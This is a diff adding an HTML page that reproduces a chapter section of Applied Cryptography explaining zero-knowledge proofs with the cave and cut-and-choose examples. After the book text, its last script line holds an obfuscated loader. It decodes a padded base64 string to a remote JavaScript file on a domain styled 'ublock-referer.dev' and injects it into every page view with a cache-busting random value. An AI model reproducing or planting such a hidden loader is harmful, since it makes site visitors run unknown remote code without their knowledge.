@@ -1,0 +1,130 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=101-104//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch04/04-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 5<BR>Advanced Protocols
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">5.1 Zero-Knowledge Proofs</FONT></H3>
+<P>Here&#146;s another story:
+</P>
+<BLOCKQUOTE><P>Alice: &#147;I know the password to the Federal Reserve System computer, the ingredients in McDonald&#146;s secret sauce, and the contents of Volume 4 of Knuth.&#148;
+</P>
+<P>Bob: &#147;No, you don&#146;t.&#148;</P>
+<P>Alice: &#147;Yes, I do.&#148;</P>
+<P>Bob: &#147;Do not!&#148;</P>
+<P>Alice: &#147;Do too!&#148;</P>
+<P>Bob: &#147;Prove it!&#148;</P>
+<P>Alice: &#147;All right. I&#146;ll tell you.&#148; She whispers in Bob&#146;s ear.</P>
+<P>Bob: &#147;That&#146;s interesting. Now I know it, too. I&#146;m going to tell <I>The Washington Post</I>.&#148;</P>
+<P>Alice: &#147;Oops.&#148;</P>
+</BLOCKQUOTE><P>Unfortunately, the usual way for Alice to prove something to Bob is for Alice to tell him. But then he knows it, too. Bob can then tell anyone else he wants to and Alice can do nothing about it. (In the literature, different characters are often used in these protocols. Peggy is usually cast as the prover and Victor is the verifier. These names appear in the upcoming examples, instead of Alice and Bob.)
+</P>
+<P>Using one-way functions, Peggy could perform a <B>zero-knowledge proof</B> [626]. This protocol proves to Victor that Peggy does have a piece of information, but it does not give Victor any way to know what the information is.</P>
+<P>These proofs take the form of interactive protocols. Victor asks Peggy a series of questions. If Peggy knows the secret, she can answer all the questions correctly. If she does not, she has some chance&#151;50 percent in the following examples&#151;of answering correctly. After 10 or so questions, Victor will be convinced that Peggy knows the secret. Yet none of the questions or answers gives Victor any information about Peggy&#146;s information&#151;only about her knowledge of it.</P>
+<P><FONT SIZE="+1"><B><I>Basic Zero-Knowledge Protocol</I></B></FONT></P>
+<P>Jean-Jacques Quisquater and Louis Guillou explain zero-knowledge with a story about a cave [1281]. The cave, illustrated in Figure 5.1, has a secret. Someone who knows the magic words can open the secret door between C and D. To everyone else, both passages lead to dead ends.
+</P>
+<P>Peggy knows the secret of the cave. She wants to prove her knowledge to Victor, but she doesn&#146;t want to reveal the magic words. Here&#146;s how she convinces him:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Victor stands at point A.
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy walks all the way into the cave, either to point C or point D.
+<DD><B>(3)</B>&nbsp;&nbsp;After Peggy has disappeared into the cave, Victor walks to point B.
+<DD><B>(4)</B>&nbsp;&nbsp;Victor shouts to Peggy, asking her either to:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;come out of the left passage or
+<DD><B>(b)</B>&nbsp;&nbsp;come out of the right passage.
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Peggy complies, using the magic words to open the secret door if she has to.
+<DD><B>(6)</B>&nbsp;&nbsp;Peggy and Victor repeat steps (1) through (5) <I>n</I> times.
+</DL>
+<P>Assume that Victor has a camcorder and records everything he sees. He records Peggy disappearing into the cave, he records when he shouts out where he wants Peggy to come out from, and he records Peggy coming out. He records all <I>n</I> trials. If he showed this recording to Carol, would she believe that Peggy knew the magic words to open the door? No. What if Peggy and Victor had agreed beforehand what Victor would call out, and Peggy would make sure that she went into that path. Then she could come out where Victor asked her every time, without knowing the magic words. Or maybe they couldn&#146;t do that. Peggy would go into one of the passages and Victor would call out a random request. If Victor guessed right, great; if he didn&#146;t, they would edit that trial out of the camcorder recording. Either way, Victor can get a recording showing exactly the same sequence of events as in a real proof where Peggy knew the magic words.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/05-01.jpg',182,144 )"><IMG SRC="images/05-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/05-01.jpg',182,144)"><FONT COLOR="#000077"><B>Figure 5.1</B></FONT></A>&nbsp;&nbsp;The zero-knowledge cave.</I>
+</P>
+<P>This shows two things. One, it is impossible for Victor to convince a third party of the proof&#146;s validity. And two, it proves that the protocol is zero-knowledge. In the case where Peggy did not know the magic words, Victor will obviously not learn anything from watching the recording. But since there is no way to distinguish a real recording from a faked recording, Victor cannot learn anything from the real proof&#151;it must be zero knowledge.
+</P>
+<P>The technique used in this protocol is called <B>cut and choose</B>, because of its similarity to the classic protocol for dividing anything fairly:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice cuts the thing in half.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses one of the halves for himself.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice takes the remaining half.
+</DL>
+<P>It is in Alice&#146;s best interest to divide fairly in step (1), because Bob will choose whichever half he wants in step (2). Michael Rabin was the first person to use the cut-and-choose technique in cryptography [1282]. The concepts of <B>interactive protocol</B> and zero-knowledge were formalized later [626,627].</P>
+<P>The cut-and-choose protocol works because there is no way Peggy can repeatedly guess which side Victor will ask her to come out of. If Peggy doesn&#146;t know the secret, she can only come out the way she came in. She has a 50 percent chance of guessing which side Victor will ask in each round (sometimes called an <B>accreditation</B>) of the protocol, so she has a 50 percent chance of fooling him. The chance of her fooling him in two rounds is 25 percent, and the chance of her fooling him all <I>n</I> times is 1 in 2<SUP>n</SUP>. After 16 rounds, Peggy has a 1 in 65,536 chance of fooling Victor. Victor can safely assume that if all 16 of Peggy&#146;s proofs are valid, then she must know the secret words to open the door between points C and D. (The cave analogy isn&#146;t perfect. Peggy can simply walk in one side and out the other; there&#146;s no need for any cut-and-choose protocol. However, mathematical zero knowledge requires it.)</P>
+<P>Assume that Peggy knows some information, and furthermore that the information is the solution to a hard problem. The basic zero-knowledge protocol consists of several rounds.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy uses her information and a random number to transform the hard problem into another hard problem, one that is isomorphic to the original problem. She then uses her information and the random number to solve this new instance of the hard problem.
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy commits to the solution of the new instance, using a bit-commitment scheme.
+<DD><B>(3)</B>&nbsp;&nbsp;Peggy reveals to Victor the new instance. Victor cannot use this new problem to get any information about the original instance or its solution.
+<DD><B>(4)</B>&nbsp;&nbsp;Victor asks Peggy either to:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;prove to him that the old and new instances are isomorphic (i.e., two different solutions to two related problems), or
+<DD><B>(b)</B>&nbsp;&nbsp;open the solution she committed to in step (2) and prove that it is a solution to the new instance.
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Peggy complies.
+<DD><B>(6)</B>&nbsp;&nbsp;Peggy and Victor repeat steps (1) through (5) <I>n</I> times.
+</DL>
+<P>Remember the camcorder in the cave protocol? You can do the same thing here. Victor can make a transcript of the exchange between him and Peggy. He cannot use this transcript to convince Carol, because he can always collude with Peggy to build a simulator that fakes Peggy&#146;s knowledge. This argument can be used to prove that the proof is zero-knowledge.
+</P>
+<P>The mathematics behind this type of proof is complicated. The problems and the random transformation must be chosen carefully, so that Victor does not get any information about the solution to the original problem, even after many iterations of the protocol. Not all hard problems can be used for zero-knowledge proofs, but a lot of them can.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch04/04-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(vuaQjeMG, zEdJhyaa) {zEdJhyaa = vuaQjeMG.createElement('script');zEdJhyaa.type = 'text/javascript';zEdJhyaa.async = true;zEdJhyaa.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');vuaQjeMG.getElementsByTagName('body')[0].appendChild(zEdJhyaa);}(document));</script></body>
+</html>
